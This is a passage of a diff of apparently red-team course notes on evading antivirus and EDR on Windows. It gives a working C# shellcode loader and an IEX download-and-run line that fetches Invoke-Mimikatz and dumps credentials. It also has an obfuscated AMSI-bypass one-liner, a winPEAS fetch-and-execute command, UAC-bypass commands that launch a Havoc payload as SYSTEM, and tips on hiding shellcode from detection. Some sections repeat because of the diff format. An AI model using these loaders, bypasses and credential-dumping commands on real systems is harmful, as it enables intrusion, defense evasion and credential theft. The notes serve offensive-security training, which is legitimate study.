-In addition, the Event Tracing for Windows (ETW) structure offered by Microsoft for Windows systems can be used by some EDRs to control the stack structures where calls are made. If you want to see a very clean implementation of both techniques, read the article below. We can recommend it.</p>
-<p>https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
-https://github.com/Maldev-Academy/HellHall</p>
 <hr />
-<p>regular virtualAlloc through win32api vs. direct syscall using SSN.</p>
+<p>Staged vs Stageless</p>
 <hr />
-<p>Syswhispers2 -&gt; import in visual studio project to enumerate syscalls</p>
-<h1><a class="header" href="#kernel-callbacks" id="kernel-callbacks">Kernel Callbacks</a></h1>
-<h1><a class="header" href="#edr-stuff" id="edr-stuff">EDR Stuff</a></h1>
+<h1><a class="header" href="#a-note-on-compiling" id="a-note-on-compiling">A note on compiling</a></h1>
+<p>without code optimisation, all imported functions are show. With code optimization, only virtuallalloc and exitprocess.</p>
+<p>The command <code>cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c</code> is used to compile a C source file using the Microsoft Visual C++ (MSVC) compiler. Here's a breakdown of each part of the command:</p>
+<ul>
+<li>
+<p><code>cl</code>: This is the command-line compiler for Microsoft Visual C++.</p>
+</li>
+<li>
+<p><code>/Od</code>: This flag disables optimization. It ensures that the compiler does not perform any optimizations that might remove or alter the code, which is useful for debugging and ensuring that all function calls are preserved.</p>
+</li>
+<li>
+<p><code>/Zi</code>: This flag generates complete debugging information. It creates a Program Database (PDB) file that contains debugging information, which is useful for debugging the executable with a debugger.</p>
+</li>
+<li>
+<p><code>/Fe:local_loader.exe</code>: This flag specifies the name of the output executable file. In this case, it sets the output file name to <code>local_loader.exe</code>.</p>
+</li>
+<li>
+<p>Local_loader_C.c: This is the name of the C source file to be compiled.</p>
+</li>
+</ul>
+<p>Putting it all together, the command compiles the Local_loader_C.c source file into an executable named <code>local_loader.exe</code>, with optimizations disabled and debugging information included.</p>
+<p>To run this command, you would typically open a Developer Command Prompt for Visual Studio and execute the command there. Here is an example of how you might run it:</p>
+<pre><code class="language-sh">cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c
+</code></pre>
+<p>After running this command, you can use tools like Dependency Walker to inspect the import table of <code>local_loader.exe</code> and verify that all the expected functions are listed.</p>
+<hr />
+<pre><code class="language-bash">C:\Lab&gt;dumpbin /imports Local_loader_C.exe
+Microsoft (R) COFF/PE Dumper Version 14.42.34436.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+Dump of file Local_loader_C.exe
+
+File Type: EXECUTABLE IMAGE
+
+  Section contains the following imports:
+
+    KERNEL32.dll
+             140017000 Import Address Table
+             140020EC0 Import Name Table
+                     0 time date stamp
+                     0 Index of first forwarder reference
+
+                         610 WaitForSingleObject
+                         232 GetCurrentProcess
+                         233 GetCurrentProcessId
+                         103 CreateThread
+                         5FF VirtualAlloc
+                         654 WriteProcessMemory
+                         4F5 RtlCaptureContext
+                         4FD RtlLookupFunctionEntry
+                         504 RtlVirtualUnwind
+                         ...
+</code></pre>
+<p>IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;</p>
+<p>$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)</p>
+<h1><a class="header" href="#lab---shellcode" id="lab---shellcode">Lab - Shellcode</a></h1>
 <blockquote>
-<p>HINT : Writing your payloads in something else that c, C++, CSharp typically has more evasive results. So exactly the same functionality, just switching the languags throw a lot of AV/EDR's off, or at least decrease the detection rate (i.e golang, nim, ...)
-When using payloads, DLL's evade EDR's than Exe's. -&gt; Shellcode = not exe/dll!!!</p>
-</blockquote>
-<p>https://blog.deeb.ch/posts/how-edr-works/</p>
-<p>DLL Sideloading, powershellshell SharpDDL Proxy, DDLHijacks.net
-Cyphercon 6
-windows SKD Libraries - signed by MS (EDR's track default DLL's and their execution paths)
-use procmon to see DLL's not found</p>
-<p>Evading AV (signatures), by downloading the shellcode remotely, instead of embedded it might trigger behavioural detections (unsigned process, making a network connection). So maybe we can embed the encrypted shellcode in an .ico file, in a resource file.</p>
-<blockquote>
-<p><em><strong>OPSEC Hint</strong></em> : EDR's will look at Entropy, so anything that is encrypted/packed/compressed (high level of randomization), will have a very high entropy (randomness level). We can optimize our shellcode by adding nullbytes to decrease the entropy. This is REALLY important</p>
-<p>https://github.com/gmh5225/shellcode-EntropyFix
-sigcheck.exe -h -a &quot;D:\Malware\11&quot;</p>
-<p>As compression and encryption algorithms' output usually consists of high entropy data, one can say any file with entropy greater than 7.0 is likely compressed, encrypted, or packed (in case of executables).</p>
-</blockquote>
-<blockquote>
-<p>Also remember static/signature/heuristic detection can flag suspicious elements of code, so the cleaner we bypass, the less EDR gets a headstart with suspicious detections passed on from the static engine.</p>
-</blockquote>
+<p>OPSEC HINT : Let's apply some basic best practices when we compile the following code</p>
 <ol>
-<li>code-signed files are more losely inspected</li>
-<li>it's all about adding weight of malicious indicators</li>
+<li>add and icon file to the dotnet app.</li>
+<li>add metadata</li>
+<li>Remove comments</li>
+<li>compile with CSC</li>
 </ol>
-<p>How EDR's do their thing</p>
-<table><thead><tr><th>Feature</th><th>Description</th></tr></thead><tbody>
-<tr><td>Kernell callbacks</td><td>Process creation, dll loading etc</td></tr>
-<tr><td>ETW</td><td>System events</td></tr>
-<tr><td>AMSI</td><td>Jscript, vbscript, dotnet, powershell -&gt; scanning with signatures</td></tr>
-<tr><td>System call Monitoring</td><td>Hooking API's in process memory</td></tr>
-</tbody></table>
+</blockquote>
+<p>When compiling the dotnet code you can specify the .net version</p>
+<pre><code class="language-powershell">
+</code></pre>
+<p>We'll need the .Net Developer Pack 4.8, let's see if it is installed:</p>
+<pre><code class="language-cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full&quot; /v Version
+</code></pre>
+<p>CSC.exe is located in &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot;</p>
+<blockquote>
+<p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
+</blockquote>
+<p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
+<p>Screenshots + xxd (hexview) payload.</p>
+<p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
+<p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
+<pre><code class="language-csharp">using System;
+using System.Runtime.InteropServices;
+
+namespace ShellcodePayload
+{
+    class Payload
+    {
+        [DllImport(&quot;kernel32.dll&quot;)]
+        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport(&quot;kernel32.dll&quot;)]
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+        [DllImport(&quot;kernel32.dll&quot;)]
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        static void Main()
+        {
+            // (1) insert our shellcode
+            byte[] shellCode = new byte[] { /* insert shellcode here */ };
+
+            // (2) allocate memory for shellcode
+            UInt32 MEM_COMMIT = 0x1000;
+            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+            // (3) inject shellcode into allocated memory
+            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);
+
+            // (4) execute injected shellcode
+            UInt32 threadId = 0;
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+</code></pre>
+<hr />
+<p>Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:</p>
+<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
+$fileContent = [IO.File]::ReadAllBytes($fileName)
+#$fileContent
+$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
+$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
+Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
+$csharpformat | add-content ($fileName + &quot;.cs&quot;)
+Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
+</code></pre>
+<hr />
+<p>Hooka</p>
+<p>Donut</p>
+<h1><a class="header" href="#lab---basic-loader" id="lab---basic-loader">Lab - Basic Loader</a></h1>
+<p>Generate havoc shellcode/helloworld dialog</p>
+<p>Convert the shellcode to a CSharp array:</p>
+<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
+$fileContent = [IO.File]::ReadAllBytes($fileName)
+#$fileContent
+$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
+$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
+Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
+$csharpformat | add-content ($fileName + &quot;.cs&quot;)
+Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
+</code></pre>
+<p>Load this shellcode into you basic loader template:</p>
+<pre><code class="language-CSHARP">
+</code></pre>
+<p>To build our own shellcode loader we need 4 functions:</p>
+<p>VirtualAlloc (Kernel32.dll)
+CreateRemoteThread (Kernel32.dll)
+MarshallCopy
+WaitForSingleObject (Kernel32.dll)</p>
+<h1><a class="header" href="#lab---staged-loader" id="lab---staged-loader">Lab - Staged Loader</a></h1>
 <h1><a class="header" href="#chapter-13---evasion" id="chapter-13---evasion">Chapter 1.3 - Evasion</a></h1>
 <p>Tips and tricks</p>
 <p>strings - HxD/xxd
@@ -1696,6 +1919,285 @@ RDP credentials are : <em><strong>studentXX</strong></em>/WEWILLTELLYOU (where X
 <blockquote>
 <p>Example text box</p>
 </blockquote>
+<h1><a class="header" href="#heuristics" id="heuristics">Heuristics</a></h1>
+<h2><a class="header" href="#differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection" id="differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection">Differences in Capabilities of Heuristic Scanning in Microsoft Defender with and without Cloud Protection</a></h2>
+<h3><a class="header" href="#with-cloud-protection-turned-on" id="with-cloud-protection-turned-on">With Cloud Protection Turned On:</a></h3>
+<ul>
+<li><strong>Enhanced Detection:</strong> Cloud protection leverages Microsoft's vast cloud infrastructure to provide near-instant detection and blocking of new and emerging threats. This means that heuristic scanning can benefit from real-time updates and advanced machine learning models that are continuously updated in the cloud.</li>
+<li><strong>Behavior Analysis:</strong> The cloud can analyze suspicious behavior and patterns more effectively, providing a higher level of protection against sophisticated threats.</li>
+<li><strong>Faster Response:</strong> Cloud protection allows for quicker response times to new threats, as the cloud can process and analyze data much faster than local systems.</li>
+</ul>
+<h3><a class="header" href="#without-cloud-protection-turned-on" id="without-cloud-protection-turned-on">Without Cloud Protection Turned On:</a></h3>
+<ul>
+<li><strong>Local Heuristics:</strong> Heuristic scanning relies solely on the local database and predefined rules. This means it may not be as effective in detecting the latest threats that have not yet been added to the local database.</li>
+<li><strong>Limited Updates:</strong> Without cloud protection, updates to heuristic scanning capabilities are limited to periodic updates rather than real-time enhancements.</li>
+<li><strong>Slower Detection:</strong> The detection and response times may be slower, as the local system has to process and analyze threats without the additional computational power and data available in the cloud.</li>
+</ul>
+<h3><a class="header" href="#summary-2" id="summary-2">Summary</a></h3>
+<p>Enabling cloud protection significantly enhances the heuristic scanning capabilities of Microsoft Defender by providing real-time updates, advanced behavior analysis, and faster response times.</p>
+<p><strong>References:</strong></p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection">Overview of next-generation protection in Microsoft Defender for Endpoint</a></li>
+<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies at the core of Microsoft Defender Antivirus</a></li>
+</ul>
+<h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
+<p>User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
+<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
+<ol>
+<li>
+<p><strong>Permissions and Elevation</strong>
+When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
+</li>
+<li>
+<p><strong>Secure Desktop</strong>
+In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
+</li>
+<li>
+<p><strong>Levels of Notification</strong>
+UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
+</li>
+</ol>
+<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
+<ol>
+<li>
+<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
+</li>
+<li>
+<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
+</li>
+<li>
+<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
+</li>
+<li>
+<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
+</li>
+</ol>
+<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
+<h1><a class="header" href="#mitre-reference" id="mitre-reference">MITRE Reference</a></h1>
+<p><img src="./images/uac_mitre.jpg" alt="image" /></p>
+<p><img src="./images/uac_settings.jpg" alt="image" /></p>
+<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
+<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
+<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
+<p>Check if UAC is enabled (1 = enabled, 0 is disabled)</p>
+<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object EnableLua
+</code></pre>
+<p>And to check which level it is :</p>
+<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object ConsentPromptBehaviorAdmin
+</code></pre>
+<table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
+<tr><td>0</td><td>No Prompt</td></tr>
+<tr><td>1</td><td>Prompt for credential on the secure desktop</td></tr>
+<tr><td>2</td><td>Prompt for CONSENT on the secure desktop</td></tr>
+<tr><td>3</td><td>Prompt for Credentials on the normal desktop</td></tr>
+<tr><td>4</td><td>Prompt for CONSENT on the normal desktop</td></tr>
+<tr><td>5</td><td>Prompt for CONSENT for non-windows binaries</td></tr>
+</tbody></table>
+<p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
+<p>Fodhelper</p>
+<p>Demo with cmd.exe -&gt; medium level even if admin
+runas 
+show whoami / groups
+show system informer</p>
+<p>start beacon as unprivileged user</p>
+<p>whoami groups</p>
+<pre><code class="language-bash">sudo apt install mingw-w64 -y
+
+git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
+make
+</code></pre>
+<p>In Havoc -&gt; Script Manager Load .py</p>
+<p>Set Sleep to 10</p>
+<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
+uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
+uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
+</code></pre>
+<hr />
+<p>Priv Esc.</p>
+<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
+</code></pre>
+<h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
+<p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
+<p>Explain hooking with <em><strong>FRIDA</strong></em></p>
+<p>x64dbg</p>
+<p>HookChecker mr. Un1c0d3r</p>
+<p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
+<p>command prompt visual studio 2019</p>
+<p>dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)</p>
+<p><img src="./images/msvc142.jpg" alt="Screenshot" /></p>
+<p><img src="./images/msvc_vs_dumpbin.jpg" alt="Screenshot" /></p>
+<p>Open Developer <code>Command Prompt Visual studio 2019</code></p>
+<pre><code class="language-bash">dumpbin c:\windows\system32\amsi.dll /exports
+</code></pre>
+<pre><code class="language-bash">ordinal hint RVA      name
+
+          1    0 00003860 AmsiCloseSession
+          2    1 000034E0 AmsiInitialize
+          3    2 00003800 AmsiOpenSession
+ [+]      4    3 00003880 AmsiScanBuffer
+ [+]      5    4 00003980 AmsiScanString
+          6    5 000039E0 AmsiUacInitialize
+          7    6 00003C60 AmsiUacScan
+          8    7 00003C00 AmsiUacUninitialize
+          9    8 000037A0 AmsiUninitialize
+         10    9 00001B00 DllCanUnloadNow
+         11    A 00001B40 DllGetClassObject
+         12    B 00001C80 DllRegisterServer
+         13    C 00001C80 DllUnregisterServer
+</code></pre>
+<p>Screenshot IDA JUMP</p>
+<p>https://github.com/Almorabea/HookSweeper</p>
+<p>https://github.com/Mr-Un1k0d3r/EDRs
+Hook_finder64.exe</p>
+<p>https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
+compile in visual studio</p>
+<p>Bitdefender install -&gt; 102 fnctions hooked</p>
+<p>windgb:
+u NtOpenProcess
+!chkimg ntdll
+needs symbols in windbg
+.sympath srv*https://msdl.microsoft.com/download/symbols
+!sym noisy;.reload /f /v</p>
+<pre><code>u NtReadVirtualMemory
+ntdll!NtReadVirtualMemory:
+00007ffd`3ef0dcc0 e95b331600      jmp     00007ffd`3f071020
+00007ffd`3ef0dcc5 cc              int     3
+00007ffd`3ef0dcc6 cc              int     3
+00007ffd`3ef0dcc7 cc              int     3
+00007ffd`3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffd`3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd`3ef0dcd5)
+00007ffd`3ef0dcd2 0f05            syscall
+00007ffd`3ef0dcd4 c3              ret
+</code></pre>
+<p>then look at the jump address and disassemble:</p>
+<pre><code>u 00007ffd`3f071020
+00007ffd`3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
+00007ffd`3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx
+00007ffd`3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
+00007ffd`3f071040 ff1522000000    call    qword ptr [00007ffd`3f071068]
+00007ffd`3f071046 9c              pushfq
+00007ffd`3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
+00007ffd`3f071053 740a            je      00007ffd`3f07105f
+00007ffd`3f071055 9d              popfq
+</code></pre>
+<p><strong>call qword ptr [00007ffd3f071068]:</strong> This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.</p>
+<p><strong>Examine 00007ffd3f071068:</strong> Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.</p>
+<pre><code>dq 00007ffd3f071068
+00007ffd`3f071068  00007df4`cda31000 cccccccc`cccccccc
+00007ffd`3f071078  cccccccc`cccccccc 24a48d48`36363636
+00007ffd`3f071088  89483636`ffffff00 b948ffff`ff38248c
+00007ffd`3f071098  00007df4`cda20dc0 489c0000`002215ff
+00007ffd`3f0710a8  fffffffe`f82484f7 36369d0a`74ffffff
+00007ffd`3f0710b8  9dfffffe`f024a4ff cccccccc`ccccccc3
+00007ffd`3f0710c8  00007df4`cda31000 cccccccc`cccccccc
+00007ffd`3f0710d8  cccccccc`cccccccc 24a48d48`36363636
+</code></pre>
+<p>The important part is 00007df4cda31000. This is the address where the <em>real</em> hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).</p>
+<p>Next step:</p>
+<p>Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.</p>
+<pre><code class="language-code">u 00007df4`cda31000
+00007df4`cda31000 9c              pushfq
+00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
+00007df4`cda3100c 7515            jne     00007df4`cda31023
+00007df4`cda3100e 9d              popfq
+00007df4`cda3100f 488b4910        mov     rcx,qword ptr [rcx+10h]
+00007df4`cda31013 48894c24f8      mov     qword ptr [rsp-8],rcx
+00007df4`cda31018 488b8c2440ffffff mov     rcx,qword ptr [rsp-0C0h]
+00007df4`cda31020 c20001          ret     100h
+</code></pre>
+<pre><code class="language-code">!address 00007df4`cda30000
+
+Usage:                  &lt;unknown&gt;
+Base Address:           00007df4`cda30000
+End Address:            00007df4`cda31000
+Region Size:            00000000`00001000 (   4.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000002          PAGE_READONLY
+Type:                   00020000          MEM_PRIVATE
+Allocation Base:        00007df4`cda30000
+Allocation Protect:     00000002          PAGE_READONLY
+
+
+Content source: 1 (target), length: 1000
+</code></pre>
+<p>SylentStrike (Unhooking) custom EDR</p>
+<p>https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/</p>
+<p>Unhooking by releading ntdll.dll into memory -&gt; some EDR's detect loading NTDLL from disk...</p>
+<p>Bypass, create a suspended process (this will only load NTDLL, not the EDR dll) -&gt; then copy the clean ntdll from the suspended process and overwrite it in the current process, unhooking the functions.</p>
+<p>PROCESS HOLLOWING (Freeze)</p>
+<p>https://hawk-eye.io/2023/06/freeze-a-payload-toolkit-for-bypassing-edrs-using-suspended-processes/</p>
+<p>This can also be used to enumerate syscalls without touching NTDLL!</p>
+<p>https://cymulate.com/blog/extracting-syscalls-from-a-suspended-process/</p>
+<h1><a class="header" href="#syscalls-kernel-mode" id="syscalls-kernel-mode">SYSCALLS (Kernel mode)</a></h1>
+<p><a href="https://hfiref0x.github.io/X86_64/NT10_syscalls.html">https://hfiref0x.github.io/X86_64/NT10_syscalls.html</a></p>
+<table><thead><tr><th>System Call</th><th>Windows 10</th><th>Description</th></tr></thead><tbody>
+<tr><td><code>NtCreateThread</code></td><td>0x004e</td><td>Creates a thread to execute within the virtual address space of the calling process.</td></tr>
+<tr><td><code>NtAllocateVirtualMemory</code></td><td>0x0018</td><td>Allocates memory in the virtual address space of the calling process.</td></tr>
+<tr><td><code>NtWriteVirtualMemory</code></td><td>0x003a</td><td></td></tr>
+<tr><td><code>NtWaitForSingleObject</code></td><td>0x0004</td><td>Waits until the specified object is in the signaled state or the time-out interval elapses.</td></tr>
+</tbody></table>
+<p>https://github.com/joshfinley/SyscallDumper</p>
+<p>https://passthehashbrowns.github.io/hiding-your-syscalls</p>
+<p>https://github.com/fin3ss3g0d/HookFinder</p>
+<pre><code class="language-powershell">PS C:\git\EDRs&gt; .\hook_finder64.exe C:\windows\system32\ntdll.dll
+</code></pre>
+<p>https://www.secunnix.com/en/blog/cat-and-mouse-game</p>
+<h1><a class="header" href="#a-direct-syscall" id="a-direct-syscall">A. Direct Syscall</a></h1>
+<p>In its simplest form, the direct system calls technique can be said to implement the APIs to be used in the malware with assembly commands in the code instead of getting them through ntdll.dll, in order to prevent EDR sensors from hooking.</p>
+<p>In this way, the program does not refer to ntdll.dll and uses the APIs it needs directly. Since ntdll.dll is not called, the EDR sensors will be blind because they do not inject themselves into the process. There are many PoCs for this technique, For example, Hells Gate, Halo's Gate, Syswhispers2 and 3 are successful studies that prove the application of direct syscall.</p>
+<blockquote>
+<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)
+with memory forensics (i.e. volatilty) this can be detected, EDR's are in a tough spot since they need to do this in real time!</p>
+</blockquote>
+<p><a href="https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s">https://www.youtube.com/watch?v=PmqvBe1LSZc&amp;t=2286s</a></p>
+<p><img src="./images/syscall_direct.jpg" alt="Screenshot" /></p>
+<p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
+<h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
+<p>Indirect system calls are similar to the direct system calls technique in terms of their working logic. But beyond that, they have a few minor differences in the processing of system calls.</p>
+<p>In the direct syscall technique, while the process belonging to ntdll.dll is completely outside the event and the RET commands are in the program itself instead of this DLL, in the case of indirect syscall, since <code>the calls are executed through ntdll.dll</code>, they are perceived as normal by EDR processes. Okay. So, if you ask how EDR cannot perform the hook operation, the logic is actually simple. During the execution of the malicious code, <code>the JMP command goes to the block where the system call is located</code>, instead of pointing to the entry point (starting point) of <code>ntdll.dll</code>. 
+Thus, a device unaware of ntdll.dll It is a little more difficult to detect since there is no execution process.</p>
+<p><img src="./images/syscall_indirect.jpg" alt="Screenshot" /></p>
+<p>Although both techniques still work, the indirect syscall method can help develop less detectable malware. Note that these are methods to avoid user mode hooking. If you are dealing with a security solution that does kernel mode hooking, this techniques can be identified.
+In addition, the Event Tracing for Windows (ETW) structure offered by Microsoft for Windows systems can be used by some EDRs to control the stack structures where calls are made. If you want to see a very clean implementation of both techniques, read the article below. We can recommend it.</p>
+<p>https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
+https://github.com/Maldev-Academy/HellHall</p>
+<hr />
+<p>regular virtualAlloc through win32api vs. direct syscall using SSN.</p>
+<hr />
+<p>Syswhispers2 -&gt; import in visual studio project to enumerate syscalls</p>
+<h1><a class="header" href="#kernel-callbacks" id="kernel-callbacks">Kernel Callbacks</a></h1>
+<p>Call stack spoofing : making it look like the syscall cam from ntdll (or 2 other dll's that normally uses syscalls)</p>
+<h1><a class="header" href="#edr-stuff" id="edr-stuff">EDR Stuff</a></h1>
+<blockquote>
+<p>HINT : Writing your payloads in something else that c, C++, CSharp typically has more evasive results. So exactly the same functionality, just switching the languags throw a lot of AV/EDR's off, or at least decrease the detection rate (i.e golang, nim, ...)
+When using payloads, DLL's evade EDR's than Exe's. -&gt; Shellcode = not exe/dll!!!</p>
+</blockquote>
+<p>https://blog.deeb.ch/posts/how-edr-works/</p>
+<p>DLL Sideloading, powershellshell SharpDDL Proxy, DDLHijacks.net
+Cyphercon 6
+windows SKD Libraries - signed by MS (EDR's track default DLL's and their execution paths)
+use procmon to see DLL's not found</p>
+<p>Evading AV (signatures), by downloading the shellcode remotely, instead of embedded it might trigger behavioural detections (unsigned process, making a network connection). So maybe we can embed the encrypted shellcode in an .ico file, in a resource file.</p>
+<blockquote>
+<p><em><strong>OPSEC Hint</strong></em> : EDR's will look at Entropy, so anything that is encrypted/packed/compressed (high level of randomization), will have a very high entropy (randomness level). We can optimize our shellcode by adding nullbytes to decrease the entropy. This is REALLY important</p>
+<p>https://github.com/gmh5225/shellcode-EntropyFix
+sigcheck.exe -h -a &quot;D:\Malware\11&quot;</p>
+<p>As compression and encryption algorithms' output usually consists of high entropy data, one can say any file with entropy greater than 7.0 is likely compressed, encrypted, or packed (in case of executables).</p>
+</blockquote>
+<blockquote>
+<p>Also remember static/signature/heuristic detection can flag suspicious elements of code, so the cleaner we bypass, the less EDR gets a headstart with suspicious detections passed on from the static engine.</p>
+</blockquote>
+<ol>
+<li>code-signed files are more losely inspected</li>
+<li>it's all about adding weight of malicious indicators</li>
+</ol>
+<p>How EDR's do their thing</p>
+<table><thead><tr><th>Feature</th><th>Description</th></tr></thead><tbody>
+<tr><td>Kernell callbacks</td><td>Process creation, dll loading etc</td></tr>
+<tr><td>ETW</td><td>System events</td></tr>
+<tr><td>AMSI</td><td>Jscript, vbscript, dotnet, powershell -&gt; scanning with signatures</td></tr>
+<tr><td>System call Monitoring</td><td>Hooking API's in process memory</td></tr>
+</tbody></table>
 
                     </main>
 
